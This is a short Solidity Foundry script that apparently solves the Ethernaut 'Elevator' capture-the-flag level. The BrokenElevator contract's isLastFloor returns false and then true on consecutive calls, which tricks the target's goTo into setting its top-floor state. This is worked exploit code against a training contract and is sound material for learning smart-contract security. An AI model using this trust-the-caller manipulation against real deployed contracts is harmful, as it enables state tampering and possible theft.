// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Elevator, Building} from "../instances/Ilevel11.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        BrokenElevator be = new BrokenElevator();
        be.gotoFloor();
        vm.stopBroadcast();
    }
}

contract BrokenElevator {
    bool public counter = false;
    Elevator elevator = new Elevator();

    function gotoFloor() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint floor) public returns (bool) {
        if (!counter) {
            counter = true;
            return false;
        } else {
            counter = false;
            return true;
        }
    }
}
